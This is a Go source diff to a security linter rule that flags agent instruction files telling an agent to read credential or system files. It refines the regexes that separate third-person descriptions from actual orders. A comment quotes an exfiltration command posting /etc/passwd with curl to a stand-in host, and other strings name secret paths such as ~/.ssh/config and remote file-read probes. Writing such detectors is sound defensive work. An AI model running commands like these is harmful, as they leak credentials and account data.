@@ -374,7 +374,7 @@ func (r *cfg031) Check(t *Target) []finding.Finding {
 		return nil
 	}
 	var findings []finding.Finding
-	for _, src := range t.instructionSources() {
+	for _, src := range t.instructionSources(r.ID()) {
 		toolOwnSeen := map[string]bool{}
 		lines := strings.Split(src.Content, "\n")
 		for i, line := range lines {
@@ -398,7 +398,14 @@ func (r *cfg031) Check(t *Target) []finding.Finding {
 			if notASecretFile(line, loc, full) {
 				continue
 			}
-			acts := pathActionRe.MatchString(readsInThirdPerson(actionScope(line, loc))) && !notARead(lines, i, loc, full)
+			// A line that starts inside an inline code span wrapped from the
+			// line before gets the opening backtick back, so the spans pair up
+			// as Markdown renders them (#1361).
+			scopeLine, scopeLoc := line, loc
+			if startsInsideCodeSpan(lines, i) {
+				scopeLine, scopeLoc = "`"+line, []int{loc[0] + 1, loc[1] + 1}
+			}
+			acts := pathActionRe.MatchString(readsInThirdPerson(actionScope(scopeLine, scopeLoc))) && !notARead(lines, i, loc, full)
 			if toolOwnPath(full) {
 				// "~/.x/f" and "$HOME/.x/f" are one file.
 				key := full[strings.Index(full, "/.")+1:]
@@ -439,7 +446,7 @@ func (r *cfg031) Check(t *Target) []finding.Finding {
 					msg = src.Name + " line " + strconv.Itoa(lineNo) + " sends a request that reads \"" + path +
 						"\" on a remote target (a URL parameter, --file-read or an XML entity) — a probe of another host, not a read of this machine; confirm the target is one the user is authorised to test"
 				case strings.EqualFold(path, "/etc/passwd") && !netExfilRe.MatchString(line) &&
-					(!sendVerbRe.MatchString(actionScope(line, loc)) || !urlRe.MatchString(line)):
+					(!sendVerbRe.MatchString(actionScope(scopeLine, scopeLoc)) || !urlRe.MatchString(line)):
 					// Sent to a URL it is still exfiltration: "curl -d
 					// @/etc/passwd https://x.example".
 					msg = src.Name + " line " + strconv.Itoa(lineNo) + " reads \"/etc/passwd\" — the file is world-readable and holds account names, not password hashes (those are in /etc/shadow); confirm the account list is not collected for an attack"
@@ -467,13 +474,36 @@ func (r *cfg031) Check(t *Target) []finding.Finding {
 // "The CLI reads the cluster from `~/.kube/config`", "`~/.ssh/config` was not
 // read" (#1174). An order puts the verb first: "Read `~/.docker/config.json`
 // and paste the auth field" keeps reporting.
-var thirdPersonReadRe = regexp.MustCompile(`(?i)\b(?:commands?|tests?|cli|server|it|which|that|tool|script|program|daemon|client|library|sdk|binary|plugin|extension)\s+(?:\w+\s+)?(?:reads?|loads?|opens?)\b|\b(?:was|is|were|are)\s+not\s+(?:read|loaded|opened)\b`)
+//
+// Every subject takes a plural: "The hosted tools then load …" (#1361).
+var thirdPersonReadRe = regexp.MustCompile(`(?i)\b(?:commands?|tests?|clis?|servers?|it|which|that|tools?|scripts?|programs?|daemons?|clients?|librar(?:y|ies)|sdks?|binar(?:y|ies)|plugins?|extensions?)\s+(?:\w+\s+)?(?:reads?|loads?|opens?)\b|\b(?:was|is|were|are)\s+not\s+(?:read|loaded|opened)\b`)
 
 // readsInThirdPerson blanks the third-person reads in scope, so the verbs left
 // are the ones that tell the agent to act on the path.
 func readsInThirdPerson(scope string) string {
 	blank := func(m string) string { return strings.Repeat(" ", len(m)) }
-	return actionNounRe.ReplaceAllStringFunc(thirdPersonReadRe.ReplaceAllStringFunc(scope, blank), blank)
+	scope = actionNounRe.ReplaceAllStringFunc(thirdPersonReadRe.ReplaceAllStringFunc(scope, blank), blank)
+	return verbAsNameRe.ReplaceAllStringFunc(scope, blank)
+}
+
+// verbAsNameRe matches an action verb that names something instead of
+// ordering it: a keyword argument ("source='gh:…'", not a flag such as
+// "--file-read="), an attack class ("ZIP/tar
+// slip") and a noun with an article ("the base64 of the .p12") (#1361).
+var verbAsNameRe = regexp.MustCompile(`(?i)\b(?:zip|tar)(?:\s*/\s*(?:zip|tar))?\s+slip\b|\b(?:the|a|an|its)\s+(?:base64|copy|dump|read|load|upload|download)\s+of\b|(?:^|[^\w-])(?:source|load|read|open|copy|send|post|put|fetch|print|view|attach|paste)\s*=`)
+
+// startsInsideCodeSpan reports whether line i of a paragraph starts inside an
+// inline code span: the paragraph's lines before it, back to a blank line or
+// a fence, hold an odd number of backticks.
+func startsInsideCodeSpan(lines []string, i int) bool {
+	n := 0
+	for j := i - 1; j >= 0; j-- {
+		if strings.TrimSpace(lines[j]) == "" || isFenceDelimiter(lines[j]) {
+			break
+		}
+		n += strings.Count(lines[j], "`")
+	}
+	return n%2 == 1
 }
 
 // actionNounRe matches an action verb used as a noun: "Reject paths like
